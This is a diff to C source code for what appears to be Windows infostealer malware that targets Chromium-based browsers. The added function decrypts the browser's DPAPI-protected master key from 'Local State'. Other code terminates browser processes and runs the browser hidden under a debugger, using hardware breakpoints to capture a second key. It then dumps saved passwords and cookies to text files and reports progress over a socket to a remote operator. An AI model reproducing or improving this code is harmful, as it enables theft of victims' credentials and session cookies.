@@ -83,17 +83,54 @@ static BYTE* decrypt_blob(const BYTE* blob, DWORD len, const BYTE* v10_key, cons
     return NULL;
 }
 
+static BYTE* get_v10_key(const char* user_data_dir, DWORD* out_len) {
+    char path[MAX_PATH];
+    _snprintf(path, sizeof(path), "%s\\Local State", user_data_dir);
+    FILE* f = fopen(path, "rb");
+    if (!f) return NULL;
+    fseek(f, 0, SEEK_END);
+    long size = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    char* buf = malloc(size + 1);
+    fread(buf, 1, size, f);
+    buf[size] = 0;
+    fclose(f);
+
+    cJSON* json = cJSON_Parse(buf);
+    free(buf);
+    if (!json) return NULL;
+    cJSON* crypt = cJSON_GetObjectItemCaseSensitive(json, "os_crypt");
+    cJSON* enc_key_node = cJSON_GetObjectItemCaseSensitive(crypt, "encrypted_key");
+    if (!enc_key_node) { cJSON_Delete(json); return NULL; }
+
+    size_t enc_len;
+    BYTE* enc_key = base64_decode(enc_key_node->valuestring, strlen(enc_key_node->valuestring), &enc_len);
+    cJSON_Delete(json);
+
+    if (enc_len < 5 || memcmp(enc_key, "DPAPI", 5) != 0) { free(enc_key); return NULL; }
+
+    DATA_BLOB in = { (DWORD)enc_len - 5, enc_key + 5 };
+    DATA_BLOB out = { 0, NULL };
+    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
+        free(enc_key);
+        *out_len = out.cbData;
+        return out.pbData;
+    }
+    free(enc_key);
+    return NULL;
+}
+
 static void kill_process(const char* name) {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return;
-    PROCESSENTRY32A pe = { sizeof(pe) };
-    if (Process32FirstA(hSnap, &pe)) {
+    PROCESSENTRY32 pe = { sizeof(pe) };
+    if (Process32First(hSnap, &pe)) {
         do {
             if (_stricmp(pe.szExeFile, name) == 0) {
                 HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                 if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
             }
-        } while (Process32NextA(hSnap, &pe));
+        } while (Process32Next(hSnap, &pe));
     }
     CloseHandle(hSnap);
 }
@@ -198,19 +235,19 @@ static void extract_from_profile(const char* profile_path, const char* out_dir, 
     sqlite3* db;
 
     // Passwords
-    sprintf(db_path, "%s\\Login Data", profile_path);
-    sprintf(out_file, "%s\\passwords.txt", out_dir);
+    _snprintf(db_path, sizeof(db_path), "%s\\Login Data", profile_path);
+    _snprintf(out_file, sizeof(out_file), "%s\\passwords.txt", out_dir);
     if (sqlite3_open(db_path, &db) == SQLITE_OK) {
-        FILE* f = fopen(out_file, "w");
+        FILE* f = fopen(out_file, "a");
         if (f) { dump_sqlite_table(db, "SELECT origin_url, username_value, password_value FROM logins", f, "LOGIN", v10, v20); fclose(f); }
         sqlite3_close(db);
     }
 
     // Cookies
-    sprintf(db_path, "%s\\Network\\Cookies", profile_path);
-    sprintf(out_file, "%s\\cookies.txt", out_dir);
+    _snprintf(db_path, sizeof(db_path), "%s\\Network\\Cookies", profile_path);
+    _snprintf(out_file, sizeof(out_file), "%s\\cookies.txt", out_dir);
     if (sqlite3_open(db_path, &db) == SQLITE_OK) {
-        FILE* f = fopen(out_file, "w");
+        FILE* f = fopen(out_file, "a");
         if (f) { dump_sqlite_table(db, "SELECT host_key, name, encrypted_value FROM cookies", f, "COOKIE", v10, v20); fclose(f); }
         sqlite3_close(db);
     }
@@ -232,13 +269,17 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
         strcat(user_data, config->user_data_subdir[i]);
     }
 
-    STARTUPINFOA si = { sizeof(si) };
+    DWORD v10_len = 0;
+    BYTE* v10_key = get_v10_key(user_data, &v10_len);
+
+    STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
     char cmd[MAX_PATH];
     _snprintf(cmd, sizeof(cmd), "\"%s\" --no-first-run", config->exe_paths[0]);
 
-    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+    if (!CreateProcess(NULL, cmd, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         sock_send(sock, mutex, "[browser_zip_err]CreateProcess failed");
+        if (v10_key) LocalFree(v10_key);
         return;
     }
 
@@ -250,7 +291,7 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
     while (WaitForDebugEvent(&de, 10000)) {
         if (de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT) {
             char path[MAX_PATH];
-            GetFinalPathNameByHandleA(de.u.LoadDll.hFile, path, MAX_PATH, 0);
+            GetFinalPathNameByHandle(de.u.LoadDll.hFile, path, MAX_PATH, 0);
             if (strstr(path, config->dll_name)) {
                 target_addr = find_target_address(pi.hProcess, de.u.LoadDll.lpBaseOfDll);
                 if (target_addr) set_hw_bp(pi.dwThreadId, target_addr);
@@ -279,15 +320,16 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
-    if (success) {
+    if (success || v10_key) {
         char out_dir[MAX_PATH];
         sprintf(out_dir, "%s\\extract", user_data);
-        CreateDirectoryA(out_dir, NULL);
+        CreateDirectory(out_dir, NULL);
         char profile[MAX_PATH];
         sprintf(profile, "%s\\Default", user_data);
-        extract_from_profile(profile, out_dir, NULL, v20_key);
+        extract_from_profile(profile, out_dir, v10_key, success ? v20_key : NULL);
         sock_send(sock, mutex, "[browser_zip_err]Extraction complete in temp folder");
     } else {
-        sock_send(sock, mutex, "[browser_zip_err]Failed to find key");
+        sock_send(sock, mutex, "[browser_zip_err]Failed to find keys");
     }
+    if (v10_key) LocalFree(v10_key);
 }
